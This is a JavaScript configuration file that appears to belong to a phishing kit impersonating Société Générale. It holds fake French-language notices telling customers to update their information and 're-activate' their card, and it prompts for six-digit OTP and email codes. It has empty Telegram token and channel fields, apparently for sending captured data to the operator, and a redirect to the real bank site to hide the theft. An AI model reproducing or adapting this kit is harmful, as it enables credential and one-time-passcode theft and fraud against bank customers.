const options = {
  base: {
    useCaptcha: false,
    captchaKey: "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI",
    label: "👻 SG. ",
    timeoutOTP: 3500, // Ms
    timeoutEmail:5000,
    otpDigit: 6,
    emailCode:6,
    redirectTo: "https://particuliers.sg.fr/",
  },
  telegram: {
    token: "",
    chanel: "",
  },
  content: {
    infoMessage: ` 
        
        <div class="px-2 text-center">
        <center>
        <img width="200px" src="./img/logo.png"/>
        </center>
        <br>
        <p>
        <b class="font-extrabold text-base">La Société générale</b> renforce la sécurité de vos comptes en ligne, <br> conformément à
la Directive Européenne sur les Services de Paiements et des services bancaires en ligne .
</p>
<div class="text-primaty font-bold p-y-3">

<div class="py-2 text-primary">
Votre compte évolue <br> , Veuillez mettre à jour vos informations et activer vos services en ligne.</div>
</div>

<p class="font-bold">
Ré-activer votre carte pour les paiements et retraits (guichet)</p>
        </div>
        
        `,
    otpMessage: `<div style="font-size:18px">
        <div class="text-bold text-primary text-h6">
        Authentification renforcée
        </div>
        Nous vous avons envoyé un code d'authentification veuillez le renseigner pour continuer .
        </div>`,
    otpIcon: `message-outline`,
    otpInputTitle: "Code ( 6 caractères )",
    otpEmailCodeTitle:"Code (6 caractères)",
  },
};

window.options = options;
